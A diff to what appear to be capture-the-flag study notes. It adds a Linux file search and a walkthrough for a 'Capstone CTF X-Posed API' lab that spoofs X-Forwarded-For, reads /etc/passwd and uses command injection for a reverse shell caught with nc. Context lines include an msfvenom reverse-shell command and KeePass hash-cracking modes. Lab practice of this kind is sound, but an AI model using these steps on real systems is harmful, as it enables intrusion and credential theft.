@@ -189,6 +189,9 @@ Find all files on the target machine using the following command:
 `Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -File | Select-Object -ExpandProperty FullName`
 use flag.txt
 
+Linux:
+`find . -type f -name '*.txt' 2>/dev/null`
+
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe`
 
@@ -287,3 +290,8 @@ Check using `hashid` or `hash-identifier` to identify the hash type, then use `h
 
 Hashcat has a mode: `-m 13400` for KeePass 2.x (AES/KDBX4) and `-m 12500` for KeePass 1.x (SHA-256/KDBX3). You can use the `--force` option to force hashcat to run even if it detects that your GPU is not supported. You can use the `--status` option to get the status.
 
+## Capstone CTF X-Posed API
+
+https://github.com/portswigger/bypass-waf - use with curl or burp.
+
+X-Posed API has a log viewer, but only accessible from localhost, so with curl you can add a header `X-Forwarded-For:` `curl -H "X-Forwarded-For: 127.0.0.1"` to make the request appear to come from localhost. You can use this to access the log viewer and view the logs, and the `/etc/passwd` file. You can use this to enumerate the users on the system and then setup a reverse shell using the `/Upload` endpoint. Here you have to post the username you found earlier together with a `url`, but turns out the `url` paramter is vulnerable to command injection so easy to setup a reverse shell. You can use `nc` to catch the shell.
